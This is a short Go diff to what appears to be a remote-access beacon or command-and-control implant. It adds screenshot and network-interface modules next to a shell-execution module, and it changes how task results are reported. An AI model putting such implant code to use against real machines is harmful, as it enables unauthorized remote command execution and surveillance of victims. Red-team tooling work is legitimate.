@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"os"
 	"os/user"
@@ -51,7 +50,9 @@ var exit_process = false
 
 // Map variable functions to map, used to call function by string-based variable
 var function_mapping = map[string]func(string) string{
-	"exec_shell": Modules.ExecShell,
+	"exec_shell":      Modules.ExecShell,
+	"get_ifaces":      Modules.GetIfaces,
+	"make_screenshot": Modules.MakeScreenshot,
 }
 
 func main() {
@@ -100,15 +101,16 @@ func ExecuteTasks(task_iod string, commands []interface{}) {
 		cmd_sleep := command_mapping["sleep"].(float64)
 		cmd_name := command_mapping["name"].(string)
 		cmd_input := command_mapping["input"].(string)
+		cmd_type := command_mapping["type"].(string)
 		cmd_output := function_mapping[cmd_name](cmd_input)
 
 		result := &Result{
 			Taskid:   task_iod,
-			Type:     "manual",
+			Type:     cmd_type,
 			Beaconid: beacon_id,
 			Command:  cmd_name,
 			Input:    cmd_input,
-			Output:   base64.StdEncoding.EncodeToString([]byte(cmd_output)),
+			Output:   cmd_output,
 		}
 
 		time.Sleep(time.Duration(cmd_sleep) * time.Second)
